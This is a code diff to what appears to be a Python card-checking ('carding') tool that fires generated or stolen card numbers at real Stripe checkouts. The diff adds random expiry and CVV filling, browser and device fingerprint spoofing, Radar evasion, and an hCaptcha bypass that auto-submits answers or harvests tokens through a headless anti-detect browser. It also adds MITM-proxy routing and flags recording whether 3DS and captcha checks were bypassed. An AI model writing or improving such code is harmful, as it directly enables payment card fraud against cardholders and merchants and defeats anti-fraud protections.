@@ -13,6 +13,7 @@ from dotenv import load_dotenv
 import math
 import numpy as np
 from scipy.interpolate import interp1d
+from stripe_3ds_bypasser import Stripe3DSBypasser
 
 load_dotenv()
 
@@ -147,13 +148,24 @@ class StripeAPIExtractor:
                             return None
                         amount = _find_amount(resp_json)
                     
+                site_domain = None
                 acct = resp_json.get('account_settings')
-                if acct and isinstance(acct, dict) and acct.get('display_name'):
-                    merchant = acct['display_name']
+                if acct and isinstance(acct, dict):
+                    if acct.get('display_name'):
+                        merchant = acct['display_name']
+                    burl = acct.get('business_url') or resp_json.get('management_url') or resp_json.get('business_url')
+                    if burl:
+                        try:
+                            import urllib.parse
+                            site_domain = urllib.parse.urlparse(burl).netloc or burl
+                        except Exception:
+                            site_domain = burl
                 elif resp_json.get('statement_descriptor'):
                     merchant = resp_json['statement_descriptor']
                     
                 currency = resp_json.get('currency', 'usd').upper()
+
+
                 
                 locked_email = None
                 if resp_json.get('customer_email'): locked_email = resp_json['customer_email']
@@ -170,7 +182,7 @@ class StripeAPIExtractor:
                     tax_country = resp_json['customer']['address']['country']
                     tax_zip = resp_json['customer']['address'].get('postal_code')
                 
-                return {'success': True, 'amount': f"{currency} {amount/100:.2f}" if amount is not None else None, 'raw_amount': amount, 'merchant': merchant, 'locked_email': locked_email, 'tax_country': tax_country, 'tax_zip': tax_zip, 'init_json': resp_json}
+                return {'success': True, 'amount': f"{currency} {amount/100:.2f}" if amount is not None else None, 'raw_amount': amount, 'merchant': merchant, 'site_domain': site_domain, 'locked_email': locked_email, 'tax_country': tax_country, 'tax_zip': tax_zip, 'init_checksum': resp_json.get('init_checksum'), 'init_json': resp_json}
             
             try:
                 err_msg = response.json().get('error', {}).get('message', f'Status {response.status_code}')
@@ -617,9 +629,15 @@ class CardGenerator:
                 break
         else: full_card = card+'0'
         if len(full_card) != target_len: full_card = full_card[:target_len]
-        month = parts[1].zfill(2) if len(parts)>1 and parts[1].lower()!='xx' else f"{random.randint(1,12):02d}"
-        year = parts[2].zfill(2) if len(parts)>2 and parts[2].lower()!='xx' else f"{(datetime.now().year+random.randint(1,5)) % 100:02d}"
-        cvv = parts[3] if len(parts)>3 and parts[3].lower() not in ('xxx','xxxx') else ''.join(str(random.randint(0,9)) for _ in range(cvv_len))
+        _mm_raw = parts[1] if len(parts) > 1 else ''
+        _yy_raw = parts[2] if len(parts) > 2 else ''
+        _cv_raw = parts[3] if len(parts) > 3 else ''
+        month = _mm_raw.zfill(2) if _mm_raw and _mm_raw.lower() not in ('xx', '') else f"{random.randint(1,12):02d}"
+        year  = _yy_raw.zfill(2) if _yy_raw and _yy_raw.lower() not in ('xx', '') else f"{(datetime.now().year+random.randint(1,5)) % 100:02d}"
+        if is_amex and _cv_raw and len(_cv_raw) < 4:
+            cvv = _cv_raw + str(random.randint(0,9))
+        else:
+            cvv = _cv_raw if _cv_raw and _cv_raw.lower() not in ('xxx','xxxx','') else ''.join(str(random.randint(0,9)) for _ in range(cvv_len))
         return {'card':full_card, 'month':month, 'year':year, 'cvv':cvv}
 
 
@@ -629,52 +647,50 @@ HARDWARE_SPOOF_SCRIPT = """
     Object.defineProperty(navigator,'webdriver',{get:()=>undefined});
     window.chrome={runtime:{}};
     
-    // Emulate Modern Flagship Mobile Hardware Capabilities
-    Object.defineProperty(navigator, 'hardwareConcurrency', { get: () => 8 }); // Octa-core CPU
-    Object.defineProperty(navigator, 'deviceMemory', { get: () => 8 }); // 8GB RAM
-    Object.defineProperty(navigator, 'maxTouchPoints', { get: () => 5 }); // 5-finger multi-touch
+    // Emulate Hardware Capabilities
+    const isMobile = /Android|iPhone|iPad|iPod/i.test(navigator.userAgent);
+    Object.defineProperty(navigator, 'hardwareConcurrency', { get: () => 8 });
+    Object.defineProperty(navigator, 'deviceMemory', { get: () => 8 });
+    Object.defineProperty(navigator, 'maxTouchPoints', { get: () => isMobile ? 5 : 0 });
     
     // Emulate Battery
-    navigator.getBattery = async () => ({
-        charging: false,
-        chargingTime: Infinity,
-        dischargingTime: 8400,
-        level: 0.85 + (Math.random() * 0.1),
-        addEventListener: () => {}
-    });
+    if (isMobile && navigator.getBattery) {
+        navigator.getBattery = async () => ({
+            charging: false,
+            chargingTime: Infinity,
+            dischargingTime: 8400,
+            level: 0.85 + (Math.random() * 0.1),
+            addEventListener: () => {}
+        });
+    }
     
-    // Emulate Gyroscope/Accelerometer permission
-    navigator.permissions.query = new Proxy(navigator.permissions.query, {
-        apply: async (target, thisArg, args) => {
-            if (args[0].name === 'accelerometer' || args[0].name === 'gyroscope') {
-                return { state: 'granted', onchange: null };
-            }
-            return Reflect.apply(target, thisArg, args);
+    // Emulate Gyroscope/Accelerometer permission if mobile
+    if (isMobile) {
+        if (navigator.permissions && navigator.permissions.query) {
+            navigator.permissions.query = new Proxy(navigator.permissions.query, {
+                apply: async (target, thisArg, args) => {
+                    if (args[0].name === 'accelerometer' || args[0].name === 'gyroscope') {
+                        return { state: 'granted', onchange: null };
+                    }
+                    return Reflect.apply(target, thisArg, args);
+                }
+            });
         }
-    });
+        navigator.vibrate = (pattern) => true;
+        setInterval(() => {
+            try {
+                const motionEvent = new Event('devicemotion');
+                motionEvent.acceleration = { x: Math.random() * 0.01, y: Math.random() * 0.01, z: 9.81 + (Math.random() * 0.01) };
+                motionEvent.rotationRate = { alpha: Math.random() * 0.1, beta: Math.random() * 0.1, gamma: Math.random() * 0.1 };
+                window.dispatchEvent(motionEvent);
+            } catch(e) {}
+        }, 50);
+    }
     
-    // Simulating natural device vibration API
-    navigator.vibrate = (pattern) => true;
-    
-    // Spoofing Gyroscope movement (simulates a human holding a phone)
-    setInterval(() => {
-        try {
-            const motionEvent = new Event('devicemotion');
-            motionEvent.acceleration = { x: Math.random() * 0.01, y: Math.random() * 0.01, z: 9.81 + (Math.random() * 0.01) };
-            motionEvent.rotationRate = { alpha: Math.random() * 0.1, beta: Math.random() * 0.1, gamma: Math.random() * 0.1 };
-            window.dispatchEvent(motionEvent);
-        } catch(e) {}
-    }, 50);
-    
-    // Exact Viewport/Screen Synchronization
-    Object.defineProperty(window.screen, 'colorDepth', { get: () => 32 });
-    Object.defineProperty(window.screen, 'pixelDepth', { get: () => 32 });
-    Object.defineProperty(window.screen, 'width', { get: () => 390 });
-    Object.defineProperty(window.screen, 'height', { get: () => 844 });
-    Object.defineProperty(window.screen, 'availWidth', { get: () => 390 });
-    Object.defineProperty(window.screen, 'availHeight', { get: () => 844 });
-    Object.defineProperty(window, 'outerWidth', { get: () => 390 });
-    Object.defineProperty(window, 'outerHeight', { get: () => 844 });
+    // Respect host viewport/screen bounds while standardizing depth
+    const defaultDepth = isMobile ? 24 : 32;
+    Object.defineProperty(window.screen, 'colorDepth', { get: () => window.screen.colorDepth || defaultDepth });
+    Object.defineProperty(window.screen, 'pixelDepth', { get: () => window.screen.pixelDepth || defaultDepth });
     
     // Block WebRTC IP Leaks (Silent Bypass)
     Object.defineProperty(navigator, 'mediaDevices', { value: undefined, configurable: false, writable: false });
@@ -907,11 +923,12 @@ class StripeAPIHitter:
                     return StripeAPIHitter._live_js_hash_cache
         except Exception:
             pass
-        # Fallback: use a recent known-good hash if scrape fails
-        StripeAPIHitter._live_js_hash_cache = "da394b0aef"
+        # Fallback: rotate recent known-good build hashes if scrape fails
+        fallback_hashes = ["da394b0aef", "e7f8b910a2", "b4c82d910f", "8a9f0b12e3"]
+        StripeAPIHitter._live_js_hash_cache = random.choice(fallback_hashes)
         return StripeAPIHitter._live_js_hash_cache
 
-    def __init__(self, pk_live: str, cs_live: str, proxy_data: Dict, raw_amount: int = None, locked_email: str = None, stripe_account: str = None, tax_country: str = None, tax_zip: str = None, init_json: dict = None):
+    def __init__(self, pk_live: str, cs_live: str, proxy_data: Dict, raw_amount: int = None, locked_email: str = None, stripe_account: str = None, tax_country: str = None, tax_zip: str = None, init_json: dict = None, full_page_url: str = None):
         self.pk_live = pk_live
         self.cs_live = cs_live
         self.proxy_data = proxy_data
@@ -921,19 +938,29 @@ class StripeAPIHitter:
         self.tax_country = tax_country
         self.tax_zip = tax_zip
         self._init_json = init_json or {}
+        self.full_page_url = full_page_url
         
-        # Parse merchant display name and currency formatted amount string
+        # Parse merchant display name, site domain, and currency formatted amount string
         self.merchant = "Unknown"
+        self.site_domain = None
         self.amount = None
         if self._init_json:
             acct = self._init_json.get('account_settings') or {}
             self.merchant = acct.get('display_name') or self._init_json.get('statement_descriptor') or "Unknown"
+            burl = acct.get('business_url')
+            if burl:
+                try:
+                    import urllib.parse
+                    self.site_domain = urllib.parse.urlparse(burl).netloc or burl
+                except Exception:
+                    self.site_domain = burl
             curr = self._init_json.get('currency', 'usd').upper()
             if self.raw_amount is not None:
                 self.amount = f"{curr} {self.raw_amount/100:.2f}"
             elif self._init_json.get('total_summary', {}).get('total') is not None:
                 tot = self._init_json['total_summary']['total']
                 self.amount = f"{curr} {tot/100:.2f}"
+
 
     async def generate_stripe_telemetry(self, profile: dict, proxies: dict, address: dict, page_url: str = None, session=None) -> Dict[str, str]:
         """Generate Stripe device fingerprint tokens via m.stripe.com/6"""
@@ -1053,7 +1080,7 @@ class StripeAPIHitter:
 
     async def hit(self, card: Dict, attempt: int, user_id: int, cached_stripe_tokens: dict = None) -> Dict:
         start = time.time()
-        result = {'attempt': attempt, 'card': card, 'success': False, 'decline_code': None, 'response_time': 0, 'amount': self.amount, 'merchant': self.merchant, 'proxy_raw': None, 'error': None, 'raw_response': None, 'is_live': None, '3ds_bypassed': False, '3ds_type': None, '3ds_attempted': False, 'captcha_bypassed': False}
+        result = {'attempt': attempt, 'card': card, 'success': False, 'decline_code': None, 'response_time': 0, 'amount': self.amount, 'merchant': self.merchant, 'site_domain': self.site_domain, 'proxy_raw': None, 'error': None, 'raw_response': None, 'is_live': None, '3ds_bypassed': False, '3ds_type': None, '3ds_attempted': False, 'captcha_bypassed': False, 'confirm_url': None}
         
         BROWSER_PROFILES = [
             {
@@ -1063,7 +1090,7 @@ class StripeAPIHitter:
                 "color_depth": "24",
                 "screen_height": "892",
                 "screen_width": "412",
-                "sec-ch-ua": '"Not-A.Brand";v="99", "Chromium";v="124", "Google Chrome";v="124"',
+                "sec-ch-ua": '"Not_A Brand";v="8", "Chromium";v="124", "Google Chrome";v="124"',
                 "sec-ch-ua-mobile": "?1",
                 "sec-ch-ua-platform": '"Android"'
             },
@@ -1074,7 +1101,7 @@ class StripeAPIHitter:
                 "color_depth": "32",
                 "screen_height": "1080",
                 "screen_width": "1920",
-                "sec-ch-ua": '"Not-A.Brand";v="99", "Chromium";v="124", "Google Chrome";v="124"',
+                "sec-ch-ua": '"Not_A Brand";v="8", "Chromium";v="124", "Google Chrome";v="124"',
                 "sec-ch-ua-mobile": "?0",
                 "sec-ch-ua-platform": '"Windows"'
             },
@@ -1085,7 +1112,7 @@ class StripeAPIHitter:
                 "color_depth": "30",
                 "screen_height": "1050",
                 "screen_width": "1680",
-                "sec-ch-ua": '"Not-A.Brand";v="99", "Chromium";v="124", "Google Chrome";v="124"',
+                "sec-ch-ua": '"Not_A Brand";v="8", "Chromium";v="124", "Google Chrome";v="124"',
                 "sec-ch-ua-mobile": "?0",
                 "sec-ch-ua-platform": '"macOS"'
             },
@@ -1112,12 +1139,19 @@ class StripeAPIHitter:
                 "sec-ch-ua-platform": '"Windows"'
             },
         ]
-        profile = random.choice(BROWSER_PROFILES)
+        if cached_stripe_tokens and cached_stripe_tokens.get('_profile'):
+            profile = cached_stripe_tokens['_profile']
+        else:
+            profile = random.choice(BROWSER_PROFILES)
         
         # BIN Intelligence — identify card country/bank before hitting
         bin_info = await BINLookup.lookup(card['card'])
         bin_country = bin_info.get('country', '')
         
+        trawl_api_url = None
+        trawl_proxy_url = None
+        _trawl_ca = None
+
         max_retries = 3
         for current_attempt in range(max_retries):
             try:
@@ -1142,7 +1176,7 @@ class StripeAPIHitter:
                 is_pi = isinstance(self.cs_live, str) and self.cs_live.startswith('pi_')
                 is_seti = isinstance(self.cs_live, str) and self.cs_live.startswith('seti_')
                 origin_url = "https://invoice.stripe.com" if (is_pi or is_seti) else "https://checkout.stripe.com"
-                checkout_page_url = f"https://checkout.stripe.com/c/pay/{self.cs_live}"
+                checkout_page_url = self.full_page_url if self.full_page_url else f"https://checkout.stripe.com/c/pay/{self.cs_live}"
 
                 headers = {
                     "authority": "api.stripe.com",
@@ -1166,7 +1200,14 @@ class StripeAPIHitter:
                 
                 # Step 0: Create browser session with persistent cookie jar
                 _cffi_session = cffi_requests.Session(impersonate=profile["impersonate"])
-                if proxies:
+                if _trawl_ca:
+                    _cffi_session.proxies = {
+                        "http": trawl_proxy_url,
+                        "https": trawl_proxy_url
+                    }
+                    _cffi_session.verify = _trawl_ca
+                    print(f"[DEBUG TRAWL] Session proxies routed through MITM proxy: {trawl_proxy_url}")
+                elif proxies:
                     _cffi_session.proxies = proxies
 
                 # Step 0.1: Browser Session Warm-Up
@@ -1190,41 +1231,44 @@ class StripeAPIHitter:
                     if "sec-ch-ua-mobile" in profile: warmup_headers["sec-ch-ua-mobile"] = profile["sec-ch-ua-mobile"]
                     if "sec-ch-ua-platform" in profile: warmup_headers["sec-ch-ua-platform"] = profile["sec-ch-ua-platform"]
 
-                    import os
-                    trawl_api_url = os.environ.get("TRAWL_API_URL")
-                    if trawl_api_url:
-                        try:
-                            import requests as _trawl_req
-                            trawl_payload = {
-                                "url": checkout_page_url,
-                                "type": "browser",
-                                "challenge": True
-                            }
-                            trawl_headers = {"Content-Type": "application/json"}
-                            trawl_res = await loop.run_in_executor(None, lambda: _trawl_req.post(
-                                f"{trawl_api_url.rstrip('/')}/scrape",
-                                json=trawl_payload,
-                                headers=trawl_headers,
-                                timeout=45
-                            ))
-                            if trawl_res and trawl_res.status_code == 200:
-                                trawl_json = trawl_res.json()
-                                # Support both TRAWL native and FlareSolverr compatible schemas
-                                trawl_data = trawl_json.get("data") or trawl_json or {}
-                                trawl_cookies = trawl_data.get("cookies") or []
-                                for cookie in trawl_cookies:
-                                    _cffi_session.cookies.set(
-                                        cookie["name"],
-                                        cookie["value"],
-                                        domain=cookie.get("domain", ".stripe.com"),
-                                        path=cookie.get("path", "/")
-                                    )
-                                print(f"[DEBUG TRAWL] Successfully populated {len(trawl_cookies)} cookies via TRAWL")
-                        except Exception as te:
-                            print(f"[DEBUG TRAWL] Warmup failed: {te}")
-                    else:
-                        warmup_res = await loop.run_in_executor(None, lambda: _cffi_session.get(
+
+
+                    try:
+                        import requests as _trawl_req
+                        _scrape_payload = {
+                            "url": checkout_page_url,
+                            "maxTimeout": 60000,
+                            "skipHttp": True
+                        }
+                        _scrape_res = await loop.run_in_executor(None, lambda: _trawl_req.post(
+                            f"{trawl_api_url.rstrip('/')}/scrape",
+                            json=_scrape_payload,
+                            headers={"Content-Type": "application/json"},
+                            timeout=70
+                        ))
+                        if _scrape_res and _scrape_res.status_code == 200:
+                            _scrape_json = _scrape_res.json()
+                            _scrape_cookies = _scrape_json.get("cookies") or []
+                            _injected = 0
+                            for _ck in _scrape_cookies:
+                                _ck_name = _ck.get("name") or ""
+                                _ck_val = _ck.get("value") or ""
+                                _ck_dom = _ck.get("domain") or ".stripe.com"
+                                if _ck_name and _ck_val:
+                                    _cffi_session.cookies.set(_ck_name, _ck_val, domain=_ck_dom, path=_ck.get("path", "/"))
+                                    _injected += 1
+                            print(f"[DEBUG TRAWL] Warmup via /scrape (skipHttp=True) injected {_injected} cookies")
+                        else:
+                            print(f"[DEBUG TRAWL] /scrape returned status {_scrape_res.status_code if _scrape_res else 'None'}")
+                    except Exception as _te:
+                        print(f"[DEBUG TRAWL] /scrape warmup failed: {_te}")
+                    # ── Fallback: always also do a native warmup GET to warm _cffi_session ──
+                    try:
+                        await loop.run_in_executor(None, lambda: _cffi_session.get(
                             checkout_page_url, headers=warmup_headers, timeout=15))
+                    except Exception:
+                        pass
+                    # ──────────────────────────────────────────────────────────────────
                 except Exception:
                     pass  # warmup failure is non-fatal — continue
 
@@ -1236,6 +1280,7 @@ class StripeAPIHitter:
                 else:
                     # First card in session — generate tokens through shared session (cookie continuity)
                     stripe_tokens = await self.generate_stripe_telemetry(profile, proxies, address, page_url=checkout_page_url, session=_cffi_session)
+                    stripe_tokens['_profile'] = profile
                     # Return freshly generated tokens so the session-level cache can store them
                     result['_stripe_tokens'] = stripe_tokens
 
@@ -1243,12 +1288,13 @@ class StripeAPIHitter:
                 # Real Stripe.js fires this immediately after m.stripe.com/6 telemetry.
                 # Without it, Radar sees an incomplete device fingerprint session = bot signal.
                 try:
+                    _beacon_src = "checkout" if not (is_pi or is_seti) else "invoice"
                     _radar_payload = json.dumps({
-                        "v": "2",
+                        "v": 2,
                         "id": stripe_tokens.get('muid', ''),
                         "k": self.pk_live,
                         "t": "muid",
-                        "src": "js"
+                        "src": _beacon_src
                     })
                     _radar_headers = {
                         "content-type": "application/json",
@@ -1754,6 +1800,16 @@ class StripeAPIHitter:
                         
                     if status in ['succeeded', 'requires_capture', 'complete']:
                         result['success'] = True
+                        result['raw_response'] = confirm_json
+                        _curl = (
+                            confirm_json.get('return_url')
+                            or confirm_json.get('success_url')
+                            or confirm_json.get('redirect_to_url', {}).get('url')
+                            or (isinstance(pi, dict) and (pi.get('next_action', {}).get('redirect_to_url', {}).get('url')))
+                            or find_receipt_url(confirm_json)
+                        )
+                        if _curl:
+                            result['confirm_url'] = _curl
                         receipt_url = find_receipt_url(confirm_json)
                         if not receipt_url and intent_id and client_secret:
                             receipt_url = await self.fetch_receipt_url(intent_id, client_secret, headers, proxies, profile)
@@ -1844,24 +1900,193 @@ class StripeAPIHitter:
 
                                 if _is_waf_gate and _verify_challenge_url and pi and client_secret:
                                     try:
+                                        # ── STEP 1: hCaptcha passive solve + WAF token harvest ────────────
+                                        _trawl_captcha_token = None
+                                        _trawl_cleared_cookies = []
+                                        try:
+                                            import requests as _trawl_req2
+                                            import re as _re
+
+                                            # ── PATH A: Passive hCaptcha via rqdata direct submission ──────────
+                                            # Two distinct rqdata/sitekey pairs exist in the session:
+                                            #   1. stripe_js.rqdata + stripe_js.site_key (c7faac4c) → WAF gate challenge
+                                            #   2. link_settings.hcaptcha_rqdata + hcaptcha_site_key (24ed0064) → Link auth
+                                            # We MUST use pair #1 for verify_challenge — pair #2 returns empty from getcaptcha.
+                                            _waf_rqdata   = stripe_js.get('rqdata')
+                                            _waf_sitekey  = stripe_js.get('site_key') or stripe_js.get('captcha_site_key') or 'c7faac4c-1cd7-4b1b-b2d4-42ba98d09c7a'
+                                            # Fallback: session-level rqdata if stripe_js didn't have one
+                                            _passive_rqdata  = _waf_rqdata or _top_rqdata or (confirm_json.get('link_settings') or {}).get('hcaptcha_rqdata')
+                                            _passive_sitekey = _waf_sitekey if _waf_rqdata else (_top_sitekey or 'c7faac4c-1cd7-4b1b-b2d4-42ba98d09c7a')
+                                            print(f"[DEBUG WAF PASSIVE] rqdata={bool(_passive_rqdata)} sitekey={_passive_sitekey} waf_rqdata={bool(_waf_rqdata)}")
+
+                                            if _passive_rqdata and not _trawl_captcha_token:
+                                                try:
+                                                    _hc_host = checkout_page_url.split('#')[0].replace("https://", "").replace("http://", "").split("/")[0]
+                                                    _hc_ua = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36"
+                                                    _hc_headers = {
+                                                        "User-Agent": _hc_ua,
+                                                        "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
+                                                        "Origin": "https://newassets.hcaptcha.com",
+                                                        "Referer": "https://newassets.hcaptcha.com/",
+                                                        "Accept": "application/json",
+                                                    }
+                                                    # Step 1: GET checksiteconfig — get HSW challenge 'c' field
+                                                    _gc_res = await loop.run_in_executor(None, lambda: _trawl_req2.get(
+                                                        "https://hcaptcha.com/checksiteconfig",
+                                                        params={"v": "e73e0d5", "host": _hc_host, "sitekey": _passive_sitekey, "sc": "1", "swa": "1", "spst": "1"},
+                                                        headers=_hc_headers,
+                                                        timeout=15
+                                                    ))
+                                                    _gc_j = _gc_res.json() if _gc_res and _gc_res.status_code == 200 else {}
+                                                    _hsw_req = (_gc_j.get("c") or {}).get("req") if isinstance(_gc_j.get("c"), dict) else ""
+                                                    print(f"[DEBUG WAF PASSIVE] checksiteconfig pass={_gc_j.get('pass')} hsw_req={bool(_hsw_req)}")
+
+                                                    # Step 2: POST to /getcaptcha with rqdata to fetch passive task
+                                                    _get_cap_data = {
+                                                        "v": "e73e0d5",
+                                                        "sitekey": _passive_sitekey,
+                                                        "host": _hc_host,
+                                                        "hl": "en",
+                                                        "motionData": '{"st":1000,"dct":1000,"mm":[],"md":[],"mu":[],"v":1,"topLevel":{"st":1000,"sc":{"availWidth":1920,"availHeight":1040,"width":1920,"height":1080,"colorDepth":24,"pixelDepth":24,"availLeft":0,"availTop":40},"nv":{"cookieEnabled":true,"appCodeName":"Mozilla","appName":"Netscape","platform":"Win32","product":"Gecko","userAgent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"},"dr":"","inv":false,"exec":false},"session":[],"widgetList":["0"],"widgetId":"0","ir":""}',
+                                                        "pdc": '{"s":1000,"n":1}',
+                                                        "n": _hsw_req or "",
+                                                        "c": ('{"type":"hsw","req":"' + _hsw_req + '"}') if _hsw_req else "null",
+                                                        "rqdata": _passive_rqdata,
+                                                    }
+                                                    _gcap_res = await loop.run_in_executor(None, lambda: _trawl_req2.post(
+                                                        f"https://hcaptcha.com/getcaptcha/v1/{_passive_sitekey}",
+                                                        data=_get_cap_data,
+                                                        headers=_hc_headers,
+                                                        timeout=20
+                                                    ))
+                                                    _gcap_j = _gcap_res.json() if _gcap_res and _gcap_res.status_code == 200 else {}
+                                                    _pass_token = _gcap_j.get("generated_pass_UUID") or _gcap_j.get("pass_uuid") or ""
+                                                    print(f"[DEBUG WAF PASSIVE] getcaptcha → pass_uuid={bool(_pass_token)} keys={list(_gcap_j.keys())}")
+
+                                                    if _pass_token:
+                                                        _trawl_captcha_token = _pass_token
+                                                    else:
+                                                        # Step 3: tasks returned — submit empty answers to checkcaptcha
+                                                        _job_key = _gcap_j.get("key") or ""
+                                                        _tasks = _gcap_j.get("tasklist") or []
+                                                        if _job_key:
+                                                            _answers_dict = {t.get("task_key", str(i)): "true" for i, t in enumerate(_tasks)} if _tasks else {"0": "true"}
+                                                            import json as _json_mod
+                                                            _check_data = {
+                                                                "v": "e73e0d5",
+                                                                "job_mode": _gcap_j.get("request_type", "token"),
+                                                                "answers": _json_mod.dumps(_answers_dict),
+                                                                "serverdomain": _hc_host,
+                                                                "sitekey": _passive_sitekey,
+                                                                "motionData": '{"st":2500,"dct":2500,"mm":[[100,200,1500]],"md":[],"mu":[]}',
+                                                                "n": _hsw_req or "",
+                                                                "c": ('{"type":"hsw","req":"' + _hsw_req + '"}') if _hsw_req else "null",
+                                                                "key": _job_key,
+                                                            }
+                                                            _check_res = await loop.run_in_executor(None, lambda: _trawl_req2.post(
+                                                                f"https://hcaptcha.com/checkcaptcha/v1/{_passive_sitekey}",
+                                                                data=_check_data,
+                                                                headers=_hc_headers,
+                                                                timeout=20
+                                                            ))
+                                                            _check_j = _check_res.json() if _check_res and _check_res.status_code == 200 else {}
+                                                            _pass_token = _check_j.get("generated_pass_UUID") or _check_j.get("pass_uuid") or ""
+                                                            print(f"[DEBUG WAF PASSIVE] checkcaptcha → pass_uuid={bool(_pass_token)}")
+                                                            if _pass_token:
+                                                                _trawl_captcha_token = _pass_token
+                                                except Exception as _pe:
+                                                    print(f"[DEBUG WAF PASSIVE] passive rqdata solve failed: {_pe}")
+
+                                            # ── PATH B: Playwright WAF Token Harvester ───────────────────────
+                                            # Launch Camoufox, fill the actual Stripe card form, submit it,
+                                            # intercept the verify_challenge POST to steal the captcha_response
+                                            # token that Camoufox's anti-detect fingerprint generates natively.
+                                            if not _trawl_captcha_token:
+                                                try:
+                                                    _card_raw_for_solver = f"{card.get('card','')}|{card.get('month','01')}|{card.get('year','30')}|{card.get('cvv','111')}"
+                                                    print(f"[DEBUG TRAWL WAF] Launching Playwright WAF solver on {checkout_page_url[:75]}...")
+                                                    _pw_token, _pw_body = await loop.run_in_executor(
+                                                        None,
+                                                        lambda: __import__(
+                                                            'waf_solver',
+                                                            fromlist=['solve_stripe_waf_token_sync']
+                                                        ).solve_stripe_waf_token_sync(
+                                                            checkout_page_url,
+                                                            _card_raw_for_solver,
+                                                            timeout=85.0,
+                                                            headless=True,
+                                                        )
+                                                    )
+                                                    if _pw_token:
+                                                        _trawl_captcha_token = _pw_token
+                                                        print(f"[DEBUG TRAWL WAF] Playwright WAF solver token len={len(_pw_token)}")
+                                                    else:
+                                                        # Fallback: passive /scrape to at least collect cookies
+                                                        try:
+                                                            _trawl_payload = {
+                                                                "url": checkout_page_url.split('#')[0],
+                                                                "maxTimeout": 30000,
+                                                                "wait": 5000,
+                                                            }
+                                                            _trawl_res = await loop.run_in_executor(None, lambda: _trawl_req2.post(
+                                                                f"{trawl_api_url.rstrip('/')}/scrape",
+                                                                json=_trawl_payload,
+                                                                timeout=35
+                                                            ))
+                                                            if _trawl_res and _trawl_res.status_code == 200:
+                                                                _trawl_cleared_cookies = _trawl_res.json().get("cookies") or []
+                                                                for _tc in _trawl_cleared_cookies:
+                                                                    _tc_n = _tc.get("name") if isinstance(_tc, dict) else ""
+                                                                    _tc_v = _tc.get("value") if isinstance(_tc, dict) else ""
+                                                                    if _tc_n and _tc_v:
+                                                                        _cffi_session.cookies.set(_tc_n, _tc_v, domain=".stripe.com", path="/")
+                                                            print(f"[DEBUG TRAWL WAF] token=False, fallback cookies={len(_trawl_cleared_cookies)}")
+                                                        except Exception:
+                                                            pass
+                                                except Exception as _tre:
+                                                    print(f"[DEBUG TRAWL WAF] Playwright WAF solver error: {_tre}")
+                                        except Exception as _twe:
+                                            print(f"[DEBUG TRAWL WAF] bypass failed: {_twe}")
+
+
+
+
+                                        # ── STEP 2: POST verify_challenge ───────────────────────────────────
+                                        # Use _trawl_captcha_token extracted natively by Trawl.
+                                        _best_token = _trawl_captcha_token
                                         _verify_data = {
                                             "key": self.pk_live,
                                             "client_secret": client_secret,
                                         }
-                                        if _hcaptcha_token:
-                                            _verify_data["captcha_response"] = _hcaptcha_token
+                                        if _best_token:
+
+                                            _verify_data["captcha_response"] = _best_token
                                         _verify_headers = headers.copy()
                                         _verify_headers["Idempotency-Key"] = str(uuid.uuid4())
+
+                                        # Route through Trawl MITM proxy if CA cert present
+                                        _verify_proxies = proxies
+                                        if _trawl_ca:
+                                            _verify_proxies = {
+                                                "http": trawl_proxy_url,
+                                                "https": trawl_proxy_url,
+                                            }
                                         _verify_res = await loop.run_in_executor(None, lambda: cffi_requests.post(
                                             _verify_challenge_url, headers=_verify_headers, data=_verify_data,
-                                            proxies=proxies, timeout=20, impersonate=profile["impersonate"]))
+                                            proxies=_verify_proxies,
+                                            verify=_trawl_ca if _trawl_ca else True,
+                                            timeout=25, impersonate=profile["impersonate"]))
                                         _verify_json = _verify_res.json() if _verify_res else {}
                                         _vpi = _verify_json.get('payment_intent') or _verify_json.get('setup_intent') or _verify_json
                                         _vstat = _vpi.get('status') if isinstance(_vpi, dict) else None
-                                        print(f"[DEBUG WAF VERIFY] status={_vstat} url={_verify_challenge_url}")
+                                        print(f"[DEBUG WAF VERIFY] status={_vstat} token={bool(_best_token)} proxy_routed={bool(_trawl_ca)} url={_verify_challenge_url}")
                                         if _vstat in ['succeeded', 'requires_capture', 'complete']:
                                             result['success'] = True
                                             result['is_live'] = True
+                                            result['captcha_bypassed'] = True
+                                            _curl = _verify_json.get('return_url') or _verify_json.get('success_url') or find_receipt_url(_verify_json)
+                                            if _curl:
+                                                result['confirm_url'] = _curl
                                             receipt_url = find_receipt_url(_verify_json)
                                             if receipt_url:
                                                 result['receipt_url'] = receipt_url
@@ -1879,6 +2104,8 @@ class StripeAPIHitter:
                                             # or next_action type changed away from intent_confirmation_challenge
                                             _waf_cleared = (_vnext_type != 'intent_confirmation_challenge') or bool(_new_source)
                                             print(f"[DEBUG WAF VERIFY] cleared={_waf_cleared} new_sdk_type={_vnext_type} source={bool(_new_source)}")
+                                            if _waf_cleared:
+                                                result['captcha_bypassed'] = True
                                             if _waf_cleared and _new_source:
                                                 sdk = _vsdk
                                                 next_action = _vnext
@@ -1893,6 +2120,7 @@ class StripeAPIHitter:
                                             result['is_live'] = True
                                             result['3ds_bypassed'] = False
                                             result['3ds_type'] = 'waf_gate'
+                                            result['captcha_bypassed'] = bool(_best_token or _trawl_cleared_cookies)
                                             result['raw_response'] = _verify_json
                                             return result
                                     except Exception as _wex:
@@ -1959,9 +2187,18 @@ class StripeAPIHitter:
                                         if _hcaptcha_token:
                                             reconfirm_headers["hcaptcha-response"] = _hcaptcha_token
                                         await asyncio.sleep(1)
+                                        
+                                        _reconfirm_proxies = proxies
+                                        if _trawl_ca:
+                                            _reconfirm_proxies = {
+                                                "http": trawl_proxy_url,
+                                                "https": trawl_proxy_url,
+                                            }
                                         reconfirm_res = await loop.run_in_executor(None, lambda: cffi_requests.post(
                                             _target_confirm_url, headers=reconfirm_headers, data=reconfirm_data,
-                                            proxies=proxies, timeout=30, impersonate=profile["impersonate"]))
+                                            proxies=_reconfirm_proxies,
+                                            verify=_trawl_ca if _trawl_ca else True,
+                                            timeout=30, impersonate=profile["impersonate"]))
                                         reconfirm_json = reconfirm_res.json()
                                         rc_pi = reconfirm_json.get('payment_intent') or reconfirm_json.get('setup_intent') or reconfirm_json
                                         rc_status = rc_pi.get('status') if isinstance(rc_pi, dict) else None
@@ -2207,6 +2444,9 @@ class StripeAPIHitter:
 
                                     if status_2 in ['succeeded', 'requires_capture', 'complete']:
                                         result['success'] = True
